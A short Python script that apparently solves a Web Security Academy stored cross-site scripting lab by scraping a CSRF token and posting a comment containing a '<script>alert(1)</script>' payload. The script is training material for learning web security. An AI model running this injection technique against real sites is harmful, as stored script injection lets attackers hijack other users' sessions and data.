import requests
import re
requests.packages.urllib3.disable_warnings()

# Edit the URL
url = "https://0a2a003b03d6c54f823c07f800d100fd.web-security-academy.net/"

global r
r = requests.Session()

def get_csrf(endpoint = "/post?postId=9") -> str:
    s = r.get(url + endpoint, verify=False)
    csrf = re.findall(r'name="csrf" value="(.+?)"', s.text)[0]
    #print(csrf)
    return csrf

def exp():
    csrf = get_csrf()
    data = {
        "csrf": csrf,
        "postId": "9",
        "comment": "<script>alert(1)</script>",
        "name": "test",
        "email": "lol@lol.com",
        "website": "https://lol.com"
    }
    s = r.post(url + "/post/comment", data=data, verify=False)
    if s.status_code == 200:
        if "Congratulations" in s.text:
            print("Lab solved!")

if __name__ == "__main__":
    exp()